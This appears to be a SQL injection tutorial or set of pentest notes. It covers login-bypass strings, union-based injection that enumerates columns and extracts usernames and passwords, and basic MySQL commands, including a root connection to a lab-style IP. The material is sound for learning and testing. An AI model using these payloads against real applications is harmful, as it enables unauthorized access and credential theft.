**Cheat sheets:**
- [MySQL SQL Injection](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet) 
- [Oracle SQL Injection](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)  
- [PostgreSQL SQL Injection](https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)

# Classic SQL Injection
This is the most common type of SQL injection, where an attacker injects malicious SQL code into an application's input fields, typically through user inputs like forms or URL parameters.

```bash
' OR '1'='1'
```
If the application does not properly sanitize input, the SQL query might look like this:
```bash
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password';
```

Also, you can use **#** . The **#** character is used for commenting. So, if the line responsible for the login is: 
````bash
SELECT * FROM users WHERE user=\$user AND password=\$password
```` 
When we login on the page and enter user=Kill-9 and password=123, the executed statement will be: 
````bash
SELECT * FROM users WHERE user='Kill-9' AND password=$123
````
 If we input:
 ````bash
 user=Kill-9'#
````
The statement will be: 
````bash
SELECT * FROM users WHERE user='Kill-9'# AND password=$123
```` 
The commented part is not processed, granting us access.


# Union-Based SQL Injection
In a union-based SQL injection, the attacker leverages the UNION SQL operator to combine results from the original query with results from their injected query.
An attacker might inject SQL code like this:
```bash
' UNION SELECT null, username, password FROM users --
```

### 1. Determine the number of columns
To carry out a successful `UNION` attack, the attacker must first determine the number of columns in the original query. There are two main methods for identifying this:

- **Using `ORDER BY`**: By incrementally increasing the column number in `ORDER BY` clauses, the attacker can find the number of columns by identifying when an error occurs. For example:
```bash
' ORDER BY 1 -- (no error, at least 1 column)
' ORDER BY 2 -- (no error, at least 2 columns)
' ORDER BY N -- (error 500, N exceeds the column count)
```
Once a certain number causes an error, the attacker deduces the original query has fewer columns than this value.

- **Using `UNION SELECT NULL`**: Another approach is to inject `UNION SELECT NULL` with different counts of `NULL` values, matching the number of columns until thereâ€™s no error. For example:
```bash
' UNION SELECT NULL -- (error, as more than one column is likely present)

' UNION SELECT NULL, NULL -- (no error, meaning the query likely has 2 columns)
```

### 2. Identifying Data Types for Columns 

After determining the number of columns, attackers need to identify the data type for each column because the `UNION` operator only works when column data types match across the original and injected query. This is achieved by using the `UNION SELECT` injection to test for data types one by one. For instance, they can replace each `NULL` with specific data type values:

- **String Data Type**: Inject a string (e.g., `'a'`) in a `NULL` placeholder to check if a column accepts text.
- **Numeric Data Type**: Use numbers in `NULL` positions to determine columns that accept integers.
- **Date Data Type**: Insert a date value (e.g., `'2023-01-01'`) to test if a column accepts dates.

For example:
```bash
' UNION SELECT 'a', NULL, NULL -- (no error means the first column is likely a text type)
' UNION SELECT NULL, 123, NULL -- (no error means the second column is likely an integer)
```

### 3. Extracting Sensitive Data

Once the attacker knows the number and type of columns, they can extract sensitive data by injecting a query that retrieves this data from other tables within the database:
```bash
' UNION SELECT NULL, username, password FROM users --
```

In this example, the attacker retrieves `username` and `password` columns from the `users` table. They may also utilize functions like `database()` to retrieve database names or `version()` to obtain the database software version.

# MySQL 

- Prints out the databases we can access:
````bash
SHOW databases;
````  

- Set to use the database named {database_name}:
````bash
USE {database_name};
````  

- Prints out the available tables inside the current database:

````bash
SHOW tables;
````  
- Prints out all the data from the table {table_name}:
````bash
SELECT * FROM {table_name};
````  


To connect:
````bash
mysql -h 10.129.42.201 -u root -p <password>
````


